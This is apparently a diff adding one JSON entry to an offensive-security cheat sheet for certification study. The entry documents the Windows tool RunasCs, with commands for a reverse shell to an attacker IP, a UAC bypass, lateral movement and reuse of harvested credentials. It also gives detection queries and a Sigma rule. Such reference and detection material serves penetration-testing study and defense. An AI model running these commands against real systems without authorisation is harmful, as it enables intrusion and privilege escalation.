@@ -1,0 +1,88 @@
+{
+  "id": "privesc-runascs",
+  "name": "RunasCs - Windows Runas Alternative with Full Credential Support",
+  "command": "RunasCs.exe <user> <password> cmd.exe",
+  "description": "RunasCs is a runas alternative that supports plaintext credentials, NTLM hashes, Kerberos tickets, and various logon types. Unlike built-in runas, it works via non-interactive sessions (reverse shells, webshells), supports network logon (type 9), and can create processes with different credential combinations.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Miscellaneous Techniques",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "antonioCoco/RunasCs; modern Windows privesc",
+  "tags": [
+    "runascs",
+    "runas",
+    "credential-usage",
+    "lateral-movement",
+    "logon-type",
+    "windows"
+  ],
+  "mitre": [
+    "T1134.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== BASIC USAGE ===\n  RunasCs.exe <user> <password> cmd.exe\n  RunasCs.exe administrator P@ssword123 \"cmd.exe /c whoami\"\n\n=== REVERSE SHELL ===\n  RunasCs.exe user pass cmd.exe -r <attacker_ip>:<port>\n  # Runs cmd.exe as 'user' and sends output to attacker\n\n=== LOGON TYPES ===\n  RunasCs.exe user pass cmd.exe -l 2    # Interactive logon (default)\n  RunasCs.exe user pass cmd.exe -l 9    # NewCredentials (like runas /netonly)\n  RunasCs.exe user pass cmd.exe -l 3    # Network logon\n  # Type 9 is most useful: local commands run as current user,\n  # network commands (SMB, LDAP, etc.) use the new credentials\n\n=== BYPASS UAC ===\n  RunasCs.exe admin pass cmd.exe --bypass-uac\n  # Starts elevated process without UAC prompt\n\n=== CREATE PROCESS ===\n  RunasCs.exe user pass powershell.exe -t 0\n  # -t 0 = create process in session 0 (service context)\n\n=== WHY NOT JUST RUNAS? ===\n- runas requires an interactive console (fails in shells)\n- runas can't do network-only logon (type 9) easily\n- runas can't bypass UAC\n- RunasCs works from webshells, reverse shells, WinRM, etc.\n\n=== CHAIN ===\n  # Found creds in config file? Spawn shell as that user:\n  RunasCs.exe svc_account DbP@ss123 cmd.exe -r 10.10.14.5:9001\n  # Or use for lateral movement:\n  RunasCs.exe admin Pass123 \"cmd.exe /c dir \\\\target\\C$\" -l 9",
+  "examples": [
+    {
+      "label": "Run command as different user",
+      "command": "RunasCs.exe administrator P@ssword123 cmd.exe"
+    },
+    {
+      "label": "Reverse shell as another user",
+      "command": "RunasCs.exe svc_account Pass123 cmd.exe -r 10.10.14.5:9001"
+    },
+    {
+      "label": "Network-only logon (runas /netonly)",
+      "command": "RunasCs.exe domain_user Pass123 powershell.exe -l 9"
+    }
+  ],
+  "references": [
+    {
+      "title": "RunasCs - GitHub",
+      "url": "https://github.com/antonioCoco/RunasCs"
+    },
+    {
+      "title": "MITRE T1134 - Access Token Manipulation",
+      "url": "https://attack.mitre.org/techniques/T1134/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "RunasCs uses Windows APIs (CreateProcessWithLogonW, LogonUser) to create processes with alternate credentials, supporting logon types that the built-in runas command doesn't expose.",
+    "prerequisites": "Valid credentials for the target user; RunasCs binary on the target.",
+    "impact": "Privilege escalation or lateral movement using discovered credentials.",
+    "detection": "[MITRE T1134.002] Unusual process creation with LogonType 9; RunasCs.exe in process logs; credential use from unexpected sources.",
+    "artifacts": "Event 4624 (logon) with specific logon types; process creation logs; RunasCs binary on disk.",
+    "splunk_spl": "index=wineventlog EventCode=4688 NewProcessName=\"*RunasCs*\"\n| table _time, SubjectUserName, NewProcessName, CommandLine, TargetUserName",
+    "elastic_kql": "process.name:\"RunasCs.exe\" OR process.command_line:*RunasCs*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4688 and (NewProcessName contains \"RunasCs\" or CommandLine contains \"RunasCs\")\n| project TimeGenerated, SubjectUserName, NewProcessName, CommandLine",
+    "sigma_rules": "proc_creation_win_runascs",
+    "prevention": "Block unauthorized binaries via AppLocker/WDAC; monitor for unusual logon types; restrict credential storage.",
+    "sources": [
+      "https://github.com/antonioCoco/RunasCs",
+      "https://attack.mitre.org/techniques/T1134/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "RunasCs execution detection",
+        "logic": "title: RunasCs Execution\nstatus: experimental\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\RunasCs.exe'\n  selection2:\n    CommandLine|contains: 'RunasCs'\n  condition: selection or selection2\nlevel: high",
+        "data_source": "sysmon",
+        "log_ids": [
+          "1"
+        ],
+        "attack": [
+          "T1134.002"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate admin use of RunasCs for service management",
+        "tuning": "Correlate with logon events (4624) and parent process"
+      }
+    ]
+  }
+}
